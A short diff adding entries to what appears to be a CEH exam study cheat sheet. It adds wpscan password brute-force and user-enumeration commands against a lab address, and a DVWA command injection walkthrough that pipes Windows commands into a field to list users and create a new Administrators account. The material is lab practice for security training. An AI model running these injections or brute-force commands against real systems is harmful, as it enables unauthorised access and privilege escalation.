@@ -48,6 +48,9 @@ Extras:-
 5) wpscan (Won't recommend but still sharing if it works good and if not use Burpsuite)
 wpscan -u james -P /password.txt — url http://172.16.0.27:8080/CEH/
 
+6) wpscan --url http://172.16.0.27:8080/CEH/ -u james -P /path/pass.txt
+wpscan --url https://example/ --enumerate u (To enumerate the user)
+
 
 SQLMAP:-
 
@@ -120,6 +123,26 @@ HASHCAT and HASHID:-
 100 - SHA1
 1400 - SHA256
 3200 - BCRYPT
+
+COMMAND INJECTION DVWA:- (not needed but still sharing for the reference)
+
+Login to DVWA
+Set Security Level "Low"
+Click on Command Injection Tab 
+Check if parameter is vulnerable or not and if it is vulnerable then follow below steps:-
+Now enter the system cmd's
+| hostname
+| whoami
+| dir C:\path.txt
+| type path.txt
+
+| net user
+| net user Test /Add
+| net user
+| net user Test
+| net localgroup Administrators Test /Add
+
+Succefully created user account.
 
 
 
